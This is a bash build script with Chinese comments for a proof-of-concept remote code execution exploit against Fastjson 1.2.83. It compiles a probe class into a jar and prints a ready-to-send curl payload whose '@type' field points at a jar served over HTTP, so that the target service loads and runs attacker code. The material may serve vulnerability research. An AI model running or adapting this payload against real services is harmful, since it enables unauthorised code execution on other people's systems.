#!/usr/bin/env bash
set -euo pipefail

# Fastjson 1.2.83 @JSONType RCE PoC 构建脚本
# 编译 GenProbe.java 并打包为 JAR
#
# 前置条件:
#   1. JDK 8 已安装
#   2. 下载 fastjson-1.2.83.jar 到当前目录:
#      wget https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.83/fastjson-1.2.83.jar
#
# 也可使用 GitHub Actions 构建:
#   推送到 GitHub → Actions → Build JARs → 下载 probe.jar

cd "$(dirname "$0")"

FASTJSON_JAR="fastjson-1.2.83.jar"
PROBE_JAR="probe.jar"

# 检查 fastjson JAR 是否存在
if [ ! -f "$FASTJSON_JAR" ]; then
    echo "[!] 未找到 $FASTJSON_JAR"
    echo "    正在下载..."
    wget -q "https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.83/fastjson-1.2.83.jar" \
        -O "$FASTJSON_JAR" || {
        echo "[!] 下载失败，请手动下载:"
        echo "    wget https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.83/fastjson-1.2.83.jar"
        exit 1
    }
    echo "[+] 下载完成"
fi

echo "[*] 编译 GenProbe.java（-d . 创建包目录结构）..."
javac -cp "$FASTJSON_JAR" -d . GenProbe.java

echo "[*] 打包为 $PROBE_JAR..."
jar cf "$PROBE_JAR" com/alibaba/fastjson/poc/GenProbe.class

echo "[+] 构建完成: $PROBE_JAR"
echo ""
echo "启动服务器:"
echo "  python3 serve.py"
echo ""
echo "发送 payload:"
echo "  curl -X POST -H 'Content-Type: application/json' \\"
echo "    --data '{\"@type\":\"jar:http:..2130706433:19090.${PROBE_JAR%.jar}!.GenProbe\",\"x\":1}' \\"
echo "    http://target:18080/parse"